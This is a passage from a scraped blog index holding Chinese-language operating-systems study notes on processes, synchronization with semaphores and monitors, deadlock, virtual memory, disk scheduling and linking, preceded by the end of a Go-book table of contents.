14.9 实现 Futures 模式   第15章：网络、模版与网页应用  15.1 tcp服务器 15.2 一个简单的web服务器 15.3 访问并读取页面数据 15.4 写一个简单的网页应用    第四部分：实际应用   第16章：\n常见的陷阱与错误\n 16.1 误用短声明导致变量覆盖 16.2 误用字符串 16.3 发生错误时使用defer关闭一个文件 16.4 何时使用new()和make() 16.5 不需要将一个指向切片的指针传递给函数 16.6 使用指针指向接口类型 16.7 使用值类型时误用指针 16.8 误用协程和通道 16.9 闭包和协程的使用 16.10 糟糕的错误处理    第17章：\n模式\n 17.1 关于逗号ok模式    第18章：\n出于性能考虑的实用代码片段\n 18.1 字符串 18.2 数组和切片 18.3 映射 18.4 结构体 18.5 接口 18.6 函数 18.7 文件 18.8 协程（goroutine）与通道（channel） 18.9 网络和网页应用 18.10 其他 18.11 出于性能考虑的最佳实践和建议    第19章：构建一个完整的应用程序\n  第20章：Go 语言在 Google App Engine 的使用\n  第21章：实际部署案例\n  附录  A 代码引用 B 有趣的 Go 引用 C 代码示例列表 D 书中的包引用 E 书中的工具引用 F 常见问题解答 G 习题答案 H 参考文献  索引 ","permalink":"https://www.fenghong.tech/blog/2018/2018-11-11-thewaytogo/","tags":["Linux","go","learning"],"title":"The way to go(directory)"},{"categories":["ops"],"contents":"[TOC]\n一、概述 基本特征 1. 并发 并发是指宏观上在一段时间内能同时运行多个程序，而并行则指同一时刻能运行多个指令。\n并行需要硬件支持，如多流水线或者多处理器。\n操作系统通过引入进程和线程，使得程序能够并发运行。\n2. 共享 共享是指系统中的资源可以被多个并发进程共同使用。\n有两种共享方式：互斥共享和同时共享。\n互斥共享的资源称为临界资源，例如打印机等，在同一时间只允许一个进程访问，需要用同步机制来实现对临界资源的访问。\n3. 虚拟 虚拟技术把一个物理实体转换为多个逻辑实体。\n主要有两种虚拟技术：时分复用技术和空分复用技术。\n多个进程能在同一个处理器上并发执行使用了时分复用技术，让每个进程轮流占有处理器，每次只执行一小个时间片并快速切换。\n虚拟内存使用了空分复用技术，它将物理内存抽象为地址空间，每个进程都有各自的地址空间。地址空间和物理内存使用页进行交换，地址空间的页并不需要全部在物理内存中，当使用到一个没有在物理内存的页时，执行页面置换算法，将该页置换到内存中。\n4. 异步 异步指进程不是一次性执行完毕，而是走走停停，以不可知的速度向前推进。\n基本功能 1. 进程管理 进程控制、进程同步、进程通信、死锁处理、处理机调度等。\n2. 内存管理 内存分配、地址映射、内存保护与共享、虚拟内存等。\n3. 文件管理 文件存储空间的管理、目录管理、文件读写管理和保护等。\n4. 设备管理 完成用户的 I/O 请求，方便用户使用各种设备，并提高设备的利用率。\n主要包括缓冲管理、设备分配、设备处理、虛拟设备等。\n系统调用 如果一个进程在用户态需要使用内核态的功能，就进行系统调用从而陷入内核，由操作系统代为完成。\nLinux 的系统调用主要有以下这些：\n   Task Commands     进程控制 fork(); exit(); wait();   进程通信 pipe(); shmget(); mmap();   文件操作 open(); read(); write();   设备操作 ioctl(); read(); write();   信息维护 getpid(); alarm(); sleep();   安全 chmod(); umask(); chown();    大内核和微内核 1. 大内核 大内核是将操作系统功能作为一个紧密结合的整体放到内核。\n由于各模块共享信息，因此有很高的性能。\n2. 微内核 由于操作系统不断复杂，因此将一部分操作系统功能移出内核，从而降低内核的复杂性。移出的部分根据分层的原则划分成若干服务，相互独立。\n在微内核结构下，操作系统被划分成小的、定义良好的模块，只有微内核这一个模块运行在内核态，其余模块运行在用户态。\n因为需要频繁地在用户态和核心态之间进行切换，所以会有一定的性能损失。\n中断分类 1. 外中断 由 CPU 执行指令以外的事件引起，如 I/O 完成中断，表示设备输入/输出处理已经完成，处理器能够发送下一个输入/输出请求。此外还有时钟中断、控制台中断等。\n2. 异常 由 CPU 执行指令的内部事件引起，如非法操作码、地址越界、算术溢出等。\n3. 陷入 在用户程序中使用系统调用。\n二、进程管理 进程与线程 1. 进程 进程是资源分配的基本单位。\n进程控制块 (Process Control Block, PCB) 描述进程的基本信息和运行状态，所谓的创建进程和撤销进程，都是指对 PCB 的操作。\n下图显示了 4 个程序创建了 4 个进程，这 4 个进程可以并发地执行。\n2. 线程 线程是独立调度的基本单位。\n一个进程中可以有多个线程，它们共享进程资源。\nQQ 和浏览器是两个进程，浏览器进程里面有很多线程，例如 HTTP 请求线程、事件响应线程、渲染线程等等，线程的并发执行使得在浏览器中点击一个新链接从而发起 HTTP 请求时，浏览器还可以响应用户的其它事件。\n3. 区别 Ⅰ 拥有资源\n进程是资源分配的基本单位，但是线程不拥有资源，线程可以访问隶属进程的资源。\nⅡ 调度\n线程是独立调度的基本单位，在同一进程中，线程的切换不会引起进程切换，从一个进程中的线程切换到另一个进程中的线程时，会引起进程切换。\nⅢ 系统开销\n由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O 设备等，所付出的开销远大于创建或撤销线程时的开销。类似地，在进行进程切换时，涉及当前执行进程 CPU 环境的保存及新调度进程 CPU 环境的设置，而线程切换时只需保存和设置少量寄存器内容，开销很小。\nⅣ 通信方面\n线程间可以通过直接读写同一进程中的数据进行通信，但是进程通信需要借助 IPC。\n进程状态的切换  就绪状态（ready）：等待被调度 运行状态（running） 阻塞状态（waiting）：等待资源  应该注意以下内容：\n 只有就绪态和运行态可以相互转换，其它的都是单向转换。就绪状态的进程通过调度算法从而获得 CPU 时间，转为运行状态；而运行状态的进程，在分配给它的 CPU 时间片用完之后就会转为就绪状态，等待下一次调度。 阻塞状态是缺少需要的资源从而由运行状态转换而来，但是该资源不包括 CPU 时间，缺少 CPU 时间会从运行态转换为就绪态。  进程调度算法 不同环境的调度算法目标不同，因此需要针对不同环境来讨论调度算法。\n1. 批处理系统 批处理系统没有太多的用户操作，在该系统中，调度算法目标是保证吞吐量和周转时间（从提交到终止的时间）。\n1.1 先来先服务 first-come first-serverd（FCFS）\n按照请求的顺序进行调度。\n有利于长作业，但不利于短作业，因为短作业必须一直等待前面的长作业执行完毕才能执行，而长作业又需要执行很长时间，造成了短作业等待时间过长。\n1.2 短作业优先 shortest job first（SJF）\n按估计运行时间最短的顺序进行调度。\n长作业有可能会饿死，处于一直等待短作业执行完毕的状态。因为如果一直有短作业到来，那么长作业永远得不到调度。\n1.3 最短剩余时间优先 shortest remaining time next（SRTN）\n按估计剩余时间最短的顺序进行调度。\n2. 交互式系统 交互式系统有大量的用户交互操作，在该系统中调度算法的目标是快速地进行响应。\n2.1 时间片轮转\n将所有就绪进程按 FCFS 的原则排成一个队列，每次调度时，把 CPU 时间分配给队首进程，该进程可以执行一个时间片。当时间片用完时，由计时器发出时钟中断，调度程序便停止该进程的执行，并将它送往就绪队列的末尾，同时继续把 CPU 时间分配给队首的进程。\n时间片轮转算法的效率和时间片的大小有很大关系：\n 因为进程切换都要保存进程的信息并且载入新进程的信息，如果时间片太小，会导致进程切换得太频繁，在进程切换上就会花过多时间。 而如果时间片过长，那么实时性就不能得到保证。  2.2 优先级调度\n为每个进程分配一个优先级，按优先级进行调度。\n为了防止低优先级的进程永远等不到调度，可以随着时间的推移增加等待进程的优先级。\n2.3 多级反馈队列\n一个进程需要执行 100 个时间片，如果采用时间片轮转调度算法，那么需要交换 100 次。\n多级队列是为这种需要连续执行多个时间片的进程考虑，它设置了多个队列，每个队列时间片大小都不同，例如 1,2,4,8,..。进程在第一个队列没执行完，就会被移到下一个队列。这种方式下，之前的进程只需要交换 7 次。\n每个队列优先权也不同，最上面的优先权最高。因此只有上一个队列没有进程在排队，才能调度当前队列上的进程。\n可以将这种调度算法看成是时间片轮转调度算法和优先级调度算法的结合。\n3. 实时系统 实时系统要求一个请求在一个确定时间内得到响应。\n分为硬实时和软实时，前者必须满足绝对的截止时间，后者可以容忍一定的超时。\n进程同步 1. 临界区 对临界资源进行访问的那段代码称为临界区。\n为了互斥访问临界资源，每个进程在进入临界区之前，需要先进行检查。\n// entry section // critical section; // exit section 2. 同步与互斥  同步：多个进程按一定顺序执行； 互斥：多个进程在同一时刻只有一个进程能进入临界区。  3. 信号量 信号量（Semaphore）是一个整型变量，可以对其执行 down 和 up 操作，也就是常见的 P 和 V 操作。\n down : 如果信号量大于 0 ，执行 -1 操作；如果信号量等于 0，进程睡眠，等待信号量大于 0； up ：对信号量执行 +1 操作，唤醒睡眠的进程让其完成 down 操作。  down 和 up 操作需要被设计成原语，不可分割，通常的做法是在执行这些操作的时候屏蔽中断。\n如果信号量的取值只能为 0 或者 1，那么就成为了 互斥量（Mutex） ，0 表示临界区已经加锁，1 表示临界区解锁。\ntypedef int semaphore; semaphore mutex = 1; void P1() { down(\u0026amp;mutex); // 临界区  up(\u0026amp;mutex); } void P2() { down(\u0026amp;mutex); // 临界区  up(\u0026amp;mutex); } 使用信号量实现生产者-消费者问题 问题描述：使用一个缓冲区来保存物品，只有缓冲区没有满，生产者才可以放入物品；只有缓冲区不为空，消费者才可以拿走物品。\n因为缓冲区属于临界资源，因此需要使用一个互斥量 mutex 来控制对缓冲区的互斥访问。\n为了同步生产者和消费者的行为，需要记录缓冲区中物品的数量。数量可以使用信号量来进行统计，这里需要使用两个信号量：empty 记录空缓冲区的数量，full 记录满缓冲区的数量。其中，empty 信号量是在生产者进程中使用，当 empty 不为 0 时，生产者才可以放入物品；full 信号量是在消费者进程中使用，当 full 信号量不为 0 时，消费者才可以取走物品。\n注意，不能先对缓冲区进行加锁，再测试信号量。也就是说，不能先执行 down(mutex) 再执行 down(empty)。如果这么做了，那么可能会出现这种情况：生产者对缓冲区加锁后，执行 down(empty) 操作，发现 empty = 0，此时生产者睡眠。消费者不能进入临界区，因为生产者对缓冲区加锁了，消费者就无法执行 up(empty) 操作，empty 永远都为 0，导致生产者永远等待下，不会释放锁，消费者因此也会永远等待下去。\n#define N 100 typedef int semaphore; semaphore mutex = 1; semaphore empty = N; semaphore full = 0; void producer() { while(TRUE) { int item = produce_item(); down(\u0026amp;empty); down(\u0026amp;mutex); insert_item(item); up(\u0026amp;mutex); up(\u0026amp;full); } } void consumer() { while(TRUE) { down(\u0026amp;full); down(\u0026amp;mutex); int item = remove_item(); consume_item(item); up(\u0026amp;mutex); up(\u0026amp;empty); } } 4. 管程 使用信号量机制实现的生产者消费者问题需要客户端代码做很多控制，而管程把控制的代码独立出来，不仅不容易出错，也使得客户端代码调用更容易。\nc 语言不支持管程，下面的示例代码使用了类 Pascal 语言来描述管程。示例代码的管程提供了 insert() 和 remove() 方法，客户端代码通过调用这两个方法来解决生产者-消费者问题。\nmonitor ProducerConsumer integer i; condition c; procedure insert(); begin // ... end; procedure remove(); begin // ... end; end monitor; 管程有一个重要特性：在一个时刻只能有一个进程使用管程。进程在无法继续执行的时候不能一直占用管程，否者其它进程永远不能使用管程。\n管程引入了 条件变量 以及相关的操作：wait() 和 signal() 来实现同步操作。对条件变量执行 wait() 操作会导致调用进程阻塞，把管程让出来给另一个进程持有。signal() 操作用于唤醒被阻塞的进程。\n使用管程实现生产者-消费者问题 // 管程 monitor ProducerConsumer condition full, empty; integer count := 0; condition c; procedure insert(item: integer); begin if count = N then wait(full); insert_item(item); count := count + 1; if count = 1 then signal(empty); end; function remove: integer; begin if count = 0 then wait(empty); remove = remove_item; count := count - 1; if count = N -1 then signal(full); end; end monitor; // 生产者客户端 procedure producer begin while true do begin item = produce_item; ProducerConsumer.insert(item); end end; // 消费者客户端 procedure consumer begin while true do begin item = ProducerConsumer.remove; consume_item(item); end end; 经典同步问题 生产者和消费者问题前面已经讨论过了。\n1. 读者-写者问题 允许多个进程同时对数据进行读操作，但是不允许读和写以及写和写操作同时发生。\n一个整型变量 count 记录在对数据进行读操作的进程数量，一个互斥量 count_mutex 用于对 count 加锁，一个互斥量 data_mutex 用于对读写的数据加锁。\ntypedef int semaphore; semaphore count_mutex = 1; semaphore data_mutex = 1; int count = 0; void reader() { while(TRUE) { down(\u0026amp;count_mutex); count++; if(count == 1) down(\u0026amp;data_mutex); // 第一个读者需要对数据进行加锁，防止写进程访问  up(\u0026amp;count_mutex); read(); down(\u0026amp;count_mutex); count--; if(count == 0) up(\u0026amp;data_mutex); up(\u0026amp;count_mutex); } } void writer() { while(TRUE) { down(\u0026amp;data_mutex); write(); up(\u0026amp;data_mutex); } } 以下内容由 @Bandi Yugandhar 提供。\nThe first case may result Writer to starve. This case favous Writers i.e no writer, once added to the queue, shall be kept waiting longer than absolutely necessary(only when there are readers that entered the queue before the writer).\nint readcount, writecount; //(initial value = 0) semaphore rmutex, wmutex, readLock, resource; //(initial value = 1) //READER void reader() { \u0026lt;ENTRY Section\u0026gt; down(\u0026amp;readLock); // reader is trying to enter down(\u0026amp;rmutex); // lock to increase readcount readcount++; if (readcount == 1) down(\u0026amp;resource); //if you are the first reader then lock the resource up(\u0026amp;rmutex); //release for other readers up(\u0026amp;readLock); //Done with trying to access the resource \u0026lt;CRITICAL Section\u0026gt; //reading is performed \u0026lt;EXIT Section\u0026gt; down(\u0026amp;rmutex); //reserve exit section - avoids race condition with readers readcount--; //indicate you're leaving if (readcount == 0) //checks if you are last reader leaving up(\u0026amp;resource); //if last, you must release the locked resource up(\u0026amp;rmutex); //release exit section for other readers } //WRITER void writer() { \u0026lt;ENTRY Section\u0026gt; down(\u0026amp;wmutex); //reserve entry section for writers - avoids race conditions writecount++; //report yourself as a writer entering if (writecount == 1) //checks if you're first writer down(\u0026amp;readLock); //if you're first, then you must lock the readers out. Prevent them from trying to enter CS up(\u0026amp;wmutex); //release entry section \u0026lt;CRITICAL Section\u0026gt; down(\u0026amp;resource); //reserve the resource for yourself - prevents other writers from simultaneously editing the shared resource //writing is performed up(\u0026amp;resource); //release file \u0026lt;EXIT Section\u0026gt; down(\u0026amp;wmutex); //reserve exit section writecount--; //indicate you're leaving if (writecount == 0) //checks if you're the last writer up(\u0026amp;readLock); //if you're last writer, you must unlock the readers. Allows them to try enter CS for reading up(\u0026amp;wmutex); //release exit section } We can observe that every reader is forced to acquire ReadLock. On the otherhand, writers doesn’t need to lock individually. Once the first writer locks the ReadLock, it will be released only when there is no writer left in the queue.\nFrom the both cases we observed that either reader or writer has to starve. Below solutionadds the constraint that no thread shall be allowed to starve; that is, the operation of obtaining a lock on the shared data will always terminate in a bounded amount of time.\nint readCount; // init to 0; number of readers currently accessing resource // all semaphores initialised to 1 Semaphore resourceAccess; // controls access (read/write) to the resource Semaphore readCountAccess; // for syncing changes to shared variable readCount Semaphore serviceQueue; // FAIRNESS: preserves ordering of requests (signaling must be FIFO) void writer() { down(\u0026amp;serviceQueue); // wait in line to be servicexs // \u0026lt;ENTER\u0026gt; down(\u0026amp;resourceAccess); // request exclusive access to resource // \u0026lt;/ENTER\u0026gt; up(\u0026amp;serviceQueue); // let next in line be serviced // \u0026lt;WRITE\u0026gt; writeResource(); // writing is performed // \u0026lt;/WRITE\u0026gt; // \u0026lt;EXIT\u0026gt; up(\u0026amp;resourceAccess); // release resource access for next reader/writer // \u0026lt;/EXIT\u0026gt; } void reader() { down(\u0026amp;serviceQueue); // wait in line to be serviced down(\u0026amp;readCountAccess); // request exclusive access to readCount // \u0026lt;ENTER\u0026gt; if (readCount == 0) // if there are no readers already reading: down(\u0026amp;resourceAccess); // request resource access for readers (writers blocked) readCount++; // update count of active readers // \u0026lt;/ENTER\u0026gt; up(\u0026amp;serviceQueue); // let next in line be serviced up(\u0026amp;readCountAccess); // release access to readCount // \u0026lt;READ\u0026gt; readResource(); // reading is performed // \u0026lt;/READ\u0026gt; down(\u0026amp;readCountAccess); // request exclusive access to readCount // \u0026lt;EXIT\u0026gt; readCount--; // update count of active readers if (readCount == 0) // if there are no readers left: up(\u0026amp;resourceAccess); // release resource access for all // \u0026lt;/EXIT\u0026gt; up(\u0026amp;readCountAccess); // release access to readCount } 2. 哲学家进餐问题 五个哲学家围着一张圆桌，每个哲学家面前放着食物。哲学家的生活有两种交替活动：吃饭以及思考。当一个哲学家吃饭时，需要先拿起自己左右两边的两根筷子，并且一次只能拿起一根筷子。\n下面是一种错误的解法，考虑到如果所有哲学家同时拿起左手边的筷子，那么就无法拿起右手边的筷子，造成死锁。\n#define N 5  void philosopher(int i) { while(TRUE) { think(); take(i); // 拿起左边的筷子  take((i+1)%N); // 拿起右边的筷子  eat(); put(i); put((i+1)%N); } } 为了防止死锁的发生，可以设置两个条件：\n 必须同时拿起左右两根筷子； 只有在两个邻居都没有进餐的情况下才允许进餐。  #define N 5 #define LEFT (i + N - 1) % N // 左邻居 #define RIGHT (i + 1) % N // 右邻居 #define THINKING 0 #define HUNGRY 1 #define EATING 2 typedef int semaphore; int state[N]; // 跟踪每个哲学家的状态 semaphore mutex = 1; // 临界区的互斥 semaphore s[N]; // 每个哲学家一个信号量  void philosopher(int i) { while(TRUE) { think(); take_two(i); eat(); put_tow(i); } } void take_two(int i) { down(\u0026amp;mutex); state[i] = HUNGRY; test(i); up(\u0026amp;mutex); down(\u0026amp;s[i]); } void put_tow(i) { down(\u0026amp;mutex); state[i] = THINKING; test(LEFT); test(RIGHT); up(\u0026amp;mutex); } void test(i) { // 尝试拿起两把筷子  if(state[i] == HUNGRY \u0026amp;\u0026amp; state[LEFT] != EATING \u0026amp;\u0026amp; state[RIGHT] !=EATING) { state[i] = EATING; up(\u0026amp;s[i]); } } 进程通信 进程同步与进程通信很容易混淆，它们的区别在于：\n 进程同步：控制多个进程按一定顺序执行； 进程通信：进程间传输信息。  进程通信是一种手段，而进程同步是一种目的。也可以说，为了能够达到进程同步的目的，需要让进程进行通信，传输一些进程同步所需要的信息。\n1. 管道 管道是通过调用 pipe 函数创建的，fd[0] 用于读，fd[1] 用于写。\n#include \u0026lt;unistd.h\u0026gt;int pipe(int fd[2]); 它具有以下限制：\n 只支持半双工通信（单向交替传输）； 只能在父子进程中使用。  2. FIFO 也称为命名管道，去除了管道只能在父子进程中使用的限制。\n#include \u0026lt;sys/stat.h\u0026gt;int mkfifo(const char *path, mode_t mode); int mkfifoat(int fd, const char *path, mode_t mode); FIFO 常用于客户-服务器应用程序中，FIFO 用作汇聚点，在客户进程和服务器进程之间传递数据。\n3. 消息队列 相比于 FIFO，消息队列具有以下优点：\n 消息队列可以独立于读写进程存在，从而避免了 FIFO 中同步管道的打开和关闭时可能产生的困难； 避免了 FIFO 的同步阻塞问题，不需要进程自己提供同步方法； 读进程可以根据消息类型有选择地接收消息，而不像 FIFO 那样只能默认地接收。  4. 信号量 它是一个计数器，用于为多个进程提供对共享数据对象的访问。\n5. 共享存储 允许多个进程共享一个给定的存储区。因为数据不需要在进程之间复制，所以这是最快的一种 IPC。\n需要使用信号量用来同步对共享存储的访问。\n多个进程可以将同一个文件映射到它们的地址空间从而实现共享内存。另外 XSI 共享内存不是使用文件，而是使用使用内存的匿名段。\n6. 套接字 与其它通信机制不同的是，它可用于不同机器间的进程通信。\n三、死锁 必要条件  互斥：每个资源要么已经分配给了一个进程，要么就是可用的。 占有和等待：已经得到了某个资源的进程可以再请求新的资源。 不可抢占：已经分配给一个进程的资源不能强制性地被抢占，它只能被占有它的进程显式地释放。 环路等待：有两个或者两个以上的进程组成一条环路，该环路中的每个进程都在等待下一个进程所占有的资源。  处理方法 主要有以下四种方法：\n 鸵鸟策略 死锁检测与死锁恢复 死锁预防 死锁避免  鸵鸟策略 把头埋在沙子里，假装根本没发生问题。\n因为解决死锁问题的代价很高，因此鸵鸟策略这种不采取任务措施的方案会获得更高的性能。\n当发生死锁时不会对用户造成多大影响，或发生死锁的概率很低，可以采用鸵鸟策略。\n大多数操作系统，包括 Unix，Linux 和 Windows，处理死锁问题的办法仅仅是忽略它。\n死锁检测与死锁恢复 不试图阻止死锁，而是当检测到死锁发生时，采取措施进行恢复。\n1. 每种类型一个资源的死锁检测 上图为资源分配图，其中方框表示资源，圆圈表示进程。资源指向进程表示该资源已经分配给该进程，进程指向资源表示进程请求获取该资源。\n图 a 可以抽取出环，如图 b，它满足了环路等待条件，因此会发生死锁。\n每种类型一个资源的死锁检测算法是通过检测有向图是否存在环来实现，从一个节点出发进行深度优先搜索，对访问过的节点进行标记，如果访问了已经标记的节点，就表示有向图存在环，也就是检测到死锁的发生。\n2. 每种类型多个资源的死锁检测 上图中，有三个进程四个资源，每个数据代表的含义如下：\n E 向量：资源总量 A 向量：资源剩余量 C 矩阵：每个进程所拥有的资源数量，每一行都代表一个进程拥有资源的数量 R 矩阵：每个进程请求的资源数量  进程 P1和 P2所请求的资源都得不到满足，只有进程 P3可以，让 P3执行，之后释放 P3拥有的资源，此时 A = (2 2 2 0)。P2可以执行，执行后释放 P2拥有的资源，A = (4 2 2 1) 。P1也可以执行。所有进程都可以顺利执行，没有死锁。\n算法总结如下：\n每个进程最开始时都不被标记，执行过程有可能被标记。当算法结束时，任何没有被标记的进程都是死锁进程。\n 寻找一个没有标记的进程 Pi，它所请求的资源小于等于 A。 如果找到了这样一个进程，那么将 C 矩阵的第 i 行向量加到 A 中，标记该进程，并转回 1。 如果没有这样一个进程，算法终止。  3. 死锁恢复  利用抢占恢复 利用回滚恢复 通过杀死进程恢复  死锁预防 在程序运行之前预防发生死锁。\n1. 破坏互斥条件 例如假脱机打印机技术允许若干个进程同时输出，唯一真正请求物理打印机的进程是打印机守护进程。\n2. 破坏占有和等待条件 一种实现方式是规定所有进程在开始执行前请求所需要的全部资源。\n3. 破坏不可抢占条件 4. 破坏环路等待 给资源统一编号，进程只能按编号顺序来请求资源。\n死锁避免 在程序运行时避免发生死锁。\n1. 安全状态 图 a 的第二列 Has 表示已拥有的资源数，第三列 Max 表示总共需要的资源数，Free 表示还有可以使用的资源数。从图 a 开始出发，先让 B 拥有所需的所有资源（图 b），运行结束后释放 B，此时 Free 变为 5（图 c）；接着以同样的方式运行 C 和 A，使得所有进程都能成功运行，因此可以称图 a 所示的状态时安全的。\n定义：如果没有死锁发生，并且即使所有进程突然请求对资源的最大需求，也仍然存在某种调度次序能够使得每一个进程运行完毕，则称该状态是安全的。\n安全状态的检测与死锁的检测类似，因为安全状态必须要求不能发生死锁。下面的银行家算法与死锁检测算法非常类似，可以结合着做参考对比。\n2. 单个资源的银行家算法 一个小城镇的银行家，他向一群客户分别承诺了一定的贷款额度，算法要做的是判断对请求的满足是否会进入不安全状态，如果是，就拒绝请求；否则予以分配。\n上图 c 为不安全状态，因此算法会拒绝之前的请求，从而避免进入图 c 中的状态。\n3. 多个资源的银行家算法 上图中有五个进程，四个资源。左边的图表示已经分配的资源，右边的图表示还需要分配的资源。最右边的 E、P 以及 A 分别表示：总资源、已分配资源以及可用资源，注意这三个为向量，而不是具体数值，例如 A=(1020)，表示 4 个资源分别还剩下 1/0/2/0。\n检查一个状态是否安全的算法如下：\n 查找右边的矩阵是否存在一行小于等于向量 A。如果不存在这样的行，那么系统将会发生死锁，状态是不安全的。 假若找到这样一行，将该进程标记为终止，并将其已分配资源加到 A 中。 重复以上两步，直到所有进程都标记为终止，则状态时安全的。  如果一个状态不是安全的，需要拒绝进入这个状态。\n四、内存管理 虚拟内存 虚拟内存的目的是为了让物理内存扩充成更大的逻辑内存，从而让程序获得更多的可用内存。\n为了更好的管理内存，操作系统将内存抽象成地址空间。每个程序拥有自己的地址空间，这个地址空间被分割成多个块，每一块称为一页。这些页被映射到物理内存，但不需要映射到连续的物理内存，也不需要所有页都必须在物理内存中。当程序引用到不在物理内存中的页时，由硬件执行必要的映射，将缺失的部分装入物理内存并重新执行失败的指令。\n从上面的描述中可以看出，虚拟内存允许程序不用将地址空间中的每一页都映射到物理内存，也就是说一个程序不需要全部调入内存就可以运行，这使得有限的内存运行大程序成为可能。例如有一台计算机可以产生 16 位地址，那么一个程序的地址空间范围是 0~64K。该计算机只有 32KB 的物理内存，虚拟内存技术允许该计算机运行一个 64K 大小的程序。\n分页系统地址映射 内存管理单元（MMU）管理着地址空间和物理内存的转换，其中的页表（Page table）存储着页（程序地址空间）和页框（物理内存空间）的映射表。\n一个虚拟地址分成两个部分，一部分存储页面号，一部分存储偏移量。\n下图的页表存放着 16 个页，这 16 个页需要用 4 个比特位来进行索引定位。例如对于虚拟地址（0010 000000000100），前 4 位是存储页面号 2，读取表项内容为（110 1），页表项最后一位表示是否存在于内存中，1 表示存在。后 12 位存储偏移量。这个页对应的页框的地址为 （110 000000000100）。\n页面置换算法 在程序运行过程中，如果要访问的页面不在内存中，就发生缺页中断从而将该页调入内存中。此时如果内存已无空闲空间，系统必须从内存中调出一个页面到磁盘对换区中来腾出空间。\n页面置换算法和缓存淘汰策略类似，可以将内存看成磁盘的缓存。在缓存系统中，缓存的大小有限，当有新的缓存到达时，需要淘汰一部分已经存在的缓存，这样才有空间存放新的缓存数据。\n页面置换算法的主要目标是使页面置换频率最低（也可以说缺页率最低）。\n1. 最佳  Optimal\n 所选择的被换出的页面将是最长时间内不再被访问，通常可以保证获得最低的缺页率。\n是一种理论上的算法，因为无法知道一个页面多长时间不再被访问。\n举例：一个系统为某进程分配了三个物理块，并有如下页面引用序列：\n开始运行时，先将 7, 0, 1 三个页面装入内存。当进程要访问页面 2 时，产生缺页中断，会将页面 7 换出，因为页面 7 再次被访问的时间最长。\n2. 最近最久未使用  LRU, Least Recently Used\n 虽然无法知道将来要使用的页面情况，但是可以知道过去使用页面的情况。LRU 将最近最久未使用的页面换出。\n为了实现 LRU，需要在内存中维护一个所有页面的链表。当一个页面被访问时，将这个页面移到链表表头。这样就能保证链表表尾的页面是最近最久未访问的。\n因为每次访问都需要更新链表，因此这种方式实现的 LRU 代价很高。\n3. 最近未使用  NRU, Not Recently Used\n 每个页面都有两个状态位：R 与 M，当页面被访问时设置页面的 R=1，当页面被修改时设置 M=1。其中 R 位会定时被清零。可以将页面分成以下四类：\n R=0，M=0 R=0，M=1 R=1，M=0 R=1，M=1  当发生缺页中断时，NRU 算法随机地从类编号最小的非空类中挑选一个页面将它换出。\nNRU 优先换出已经被修改的脏页面（R=0，M=1），而不是被频繁使用的干净页面（R=1，M=0）。\n4. 先进先出  FIFO, First In First Out\n 选择换出的页面是最先进入的页面。\n该算法会将那些经常被访问的页面也被换出，从而使缺页率升高。\n5. 第二次机会算法 FIFO 算法可能会把经常使用的页面置换出去，为了避免这一问题，对该算法做一个简单的修改：\n当页面被访问 (读或写) 时设置该页面的 R 位为 1。需要替换的时候，检查最老页面的 R 位。如果 R 位是 0，那么这个页面既老又没有被使用，可以立刻置换掉；如果是 1，就将 R 位清 0，并把该页面放到链表的尾端，修改它的装入时间使它就像刚装入的一样，然后继续从链表的头部开始搜索。\n6. 时钟  Clock\n 第二次机会算法需要在链表中移动页面，降低了效率。时钟算法使用环形链表将页面连接起来，再使用一个指针指向最老的页面。\n分段 虚拟内存采用的是分页技术，也就是将地址空间划分成固定大小的页，每一页再与内存进行映射。\n下图为一个编译器在编译过程中建立的多个表，有 4 个表是动态增长的，如果使用分页系统的一维地址空间，动态增长的特点会导致覆盖问题的出现。\n分段的做法是把每个表分成段，一个段构成一个独立的地址空间。每个段的长度可以不同，并且可以动态增长。\n段页式 程序的地址空间划分成多个拥有独立地址空间的段，每个段上的地址空间划分成大小相同的页。这样既拥有分段系统的共享和保护，又拥有分页系统的虚拟内存功能。\n分页与分段的比较   对程序员的透明性：分页透明，但是分段需要程序员显示划分每个段。\n  地址空间的维度：分页是一维地址空间，分段是二维的。\n  大小是否可以改变：页的大小不可变，段的大小可以动态改变。\n  出现的原因：分页主要用于实现虚拟内存，从而获得更大的地址空间；分段主要是为了使程序和数据可以被划分为逻辑上独立的地址空间并且有助于共享和保护。\n  五、设备管理 磁盘结构  盘面（Platter）：一个磁盘有多个盘面； 磁道（Track）：盘面上的圆形带状区域，一个盘面可以有多个磁道； 扇区（Track Sector）：磁道上的一个弧段，一个磁道可以有多个扇区，它是最小的物理储存单位，目前主要有 512 bytes 与 4 K 两种大小； 磁头（Head）：与盘面非常接近，能够将盘面上的磁场转换为电信号（读），或者将电信号转换为盘面的磁场（写）； 制动手臂（Actuator arm）：用于在磁道之间移动磁头； 主轴（Spindle）：使整个盘面转动。  磁盘调度算法 读写一个磁盘块的时间的影响因素有：\n 旋转时间（主轴转动盘面，使得磁头移动到适当的扇区上） 寻道时间（制动手臂移动，使得磁头移动到适当的磁道上） 实际的数据传输时间  其中，寻道时间最长，因此磁盘调度的主要目标是使磁盘的平均寻道时间最短。\n1. 先来先服务  FCFS, First Come First Served\n 按照磁盘请求的顺序进行调度。\n优点是公平和简单。缺点也很明显，因为未对寻道做任何优化，使平均寻道时间可能较长。\n2. 最短寻道时间优先  SSTF, Shortest Seek Time First\n 优先调度与当前磁头所在磁道距离最近的磁道。\n虽然平均寻道时间比较低，但是不够公平。如果新到达的磁道请求总是比一个在等待的磁道请求近，那么在等待的磁道请求会一直等待下去，也就是出现饥饿现象。具体来说，两端的磁道请求更容易出现饥饿现象。\n3. 电梯算法  SCAN\n 电梯总是保持一个方向运行，直到该方向没有请求为止，然后改变运行方向。\n电梯算法（扫描算法）和电梯的运行过程类似，总是按一个方向来进行磁盘调度，直到该方向上没有未完成的磁盘请求，然后改变方向。\n因为考虑了移动方向，因此所有的磁盘请求都会被满足，解决了 SSTF 的饥饿问题。\n六、链接 编译系统 以下是一个 hello.c 程序：\n#include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;hello, world\\n\u0026#34;); return 0; } 在 Unix 系统上，由编译器把源文件转换为目标文件。\ngcc -o hello hello.c 这个过程大致如下：\n 预处理阶段：处理以 # 开头的预处理命令； 编译阶段：翻译成汇编文件； 汇编阶段：将汇编文件翻译成可重定向目标文件； 链接阶段：将可重定向目标文件和 printf.o 等单独预编译好的目标文件进行合并，得到最终的可执行目标文件。  静态链接 静态链接器以一组可重定向目标文件为输入，生成一个完全链接的可执行目标文件作为输出。链接器主要完成以下两个任务：\n 符号解析：每个符号对应于一个函数、一个全局变量或一个静态变量，符号解析的目的是将每个符号引用与一个符号定义关联起来。 